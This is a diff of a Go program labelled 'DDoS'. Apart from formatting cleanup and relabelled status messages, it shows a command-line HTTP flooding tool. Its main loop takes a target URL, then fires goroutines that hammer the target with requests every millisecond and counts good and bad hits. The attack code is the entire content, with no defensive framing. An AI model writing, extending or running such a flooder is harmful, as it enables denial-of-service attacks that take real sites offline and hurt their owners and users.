@@ -1,10 +1,8 @@
 /**
-  DDoS
+  DDoS 
 **/
 
-
-
-
+package main
 
 import (
 	"encoding/json"
@@ -15,10 +13,6 @@ import (
 	"net/http"
 	"net/url"
 	"time"
-
-
-
-	
 )
 
 var completeCount = 0
@@ -36,7 +30,7 @@ func main() {
 	var data url.Values
 
 	if *attackUrl != "" {
-           
+
 		if *_data != "" {
 			_body := getData(*method, *_data)
 			data = _body
@@ -45,14 +39,12 @@ func main() {
 		rand.Seed(time.Now().UnixNano())
 		for i := 0; i < *count; i++ {
 			if i%4 == 0 {
-				
-
-				fmt.Println("ddos Attack  :", i, "ល្អ:", completeCount, "CAT😼:", errorCount)
+				fmt.Println("Strike Hit:", i, "Good:", completeCount, "Bad:", errorCount)
 			}
 			go startAttack(*attackUrl, *method, data)
 			time.Sleep(time.Millisecond)
 		}
-		fmt.Println("Done.", "ល្អ: ", completeCount, "Error: ", errorCount)
+		fmt.Println("Done.", "Good: ", completeCount, "Error: ", errorCount)
 	} else {
 		fmt.Println("use -url http://target.com")
 	}
